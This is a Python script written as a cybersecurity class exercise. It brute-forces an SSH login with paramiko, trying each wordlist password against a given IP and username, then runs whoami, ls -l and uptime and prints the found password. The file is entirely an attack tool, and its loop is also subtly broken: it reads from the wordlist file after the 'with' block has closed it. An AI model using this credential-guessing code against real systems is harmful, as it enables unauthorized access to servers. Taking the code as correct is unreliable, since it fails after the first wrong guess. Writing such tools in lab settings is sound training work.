#!/usr/bin/env python3

# Script Name:                  Challenge 401 Class 17
# Author Name:                  Nathalie Abdallah
# Date of latest revision:      01/30/2024
# Sources:                      https://chat.openai.com/, https://www.youtube.com/watch?v=vk4WWIreH8Q, https://thepythoncode.com/article/encrypt-decrypt-files-symmetric-python, https://pypi.org/project/cryptography/
# Purpose:                      Add to your Python brute force tool the capability to:

# Authenticate to an SSH server by its IP address.
# Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.
# Note: Stay out of trouble! Restrict this kind of traffic to your local network VMs.

import time
import paramiko
import sys

host = input("IP:")
user = input("Username: ")
filepath = input("filepath: ")
port = 22
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

with open(filepath, 'r') as file:
    line = file.readline()
    print(line)

while line:
    password = line.strip()
    try:
      ssh.connect(host, port, user, password)
      stdin, stdout, stderr = ssh.exec_command("whoami")
      time.sleep(3)
      output = stdout.read()
      print("________________")
      print(output)
      print("________________")
      stdin, stdout, stderr = ssh.exec_command("ls -l")
      time.sleep(3)
      output = stdout.read()
      print("________________")
      print(output)
      print("________________")
      stdin, stdout, stderr = ssh.exec_command("uptime")
      time.sleep(3)
      output = stdout.read()
      print("________________")
      print(output)
      print("________________")
      print(f"password is: {password}")
      print("________________")
      break # Exit the loop if successful login occurs
    
    except paramiko.AuthenticationException as e:
      print("________________")
      print(f"Password: {password}")
      print(e)
      print("________________")
    line = file.readline()

file.close()
ssh.close()